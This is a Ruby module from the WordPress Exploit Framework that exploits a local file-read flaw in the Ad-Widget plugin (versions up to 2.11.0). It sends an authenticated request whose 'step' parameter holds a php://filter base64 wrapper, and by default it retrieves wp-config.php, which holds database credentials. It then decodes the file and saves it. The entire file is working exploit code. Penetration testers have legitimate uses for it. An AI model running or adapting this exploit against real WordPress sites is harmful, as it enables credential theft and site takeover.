# frozen_string_literal: true

class Wpxf::Auxiliary::AdWidgetPhpFileDownload < Wpxf::Module
  include Wpxf::WordPress::FileDownload

  def initialize
    super

    update_info(
      name: 'Ad-Widget <= 2.11.0 Authenticated PHP File Download',
      author: [
        'rastating' # WPXF module
      ],
      references: [
        ['WPVDB', '8789']
      ],
      date: 'Apr 04 2017'
    )
  end

  def check
    check_plugin_version_from_readme('ad-widget', '2.12.0')
  end

  def requires_authentication
    true
  end

  def default_remote_file_path
    '../wp-config'
  end

  def working_directory
    'wp-admin/'
  end

  def file_extension
    '.php'
  end

  def downloader_url
    normalize_uri(wordpress_url_plugins, 'ad-widget', 'views', 'modal', 'index.php')
  end

  def validate_content(res)
    return false unless super(res)
    File.write(downloaded_filename, Base64.decode64(res))
    true
  end

  def download_request_params
    { 'step' => "php://filter/convert.base64-encode/resource=#{remote_file}" }
  end
end
